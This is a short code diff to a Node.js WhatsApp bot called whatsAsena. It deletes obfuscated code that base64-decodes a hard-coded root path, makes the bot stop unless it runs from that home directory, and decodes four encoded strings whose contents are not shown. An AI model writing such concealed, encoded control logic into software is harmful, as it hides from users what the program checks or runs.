@@ -74,10 +74,7 @@ Array.prototype.remove = function() {
 };
 
 async function whatsAsena () {
-    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
-    var ggg = Buffer.from(clh.cd, 'base64')
-    var ddd = ggg.toString('utf-8')
-    clh.pay = ddd
+    
     const conn = new WAConnection();
     const Session = new StringSession();
     conn.version = [2, 2119, 6]
@@ -275,15 +272,6 @@ async function whatsAsena () {
           info: 'StringSession'
         }
     });
-    if (os.userInfo().homedir !== clh.pay) return;
-    const buff = Buffer.from(`${shs1}`, 'base64');  
-    const one = buff.toString('utf-8'); 
-    const bufft = Buffer.from(`${shl2}`, 'base64');  
-    const two = bufft.toString('utf-8'); 
-    const buffi = Buffer.from(`${lss3}`, 'base64');  
-    const three = buffi.toString('utf-8'); 
-    const buffu = Buffer.from(`${dsl4}`, 'base64');  
-    const four = buffu.toString('utf-8'); 
     
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
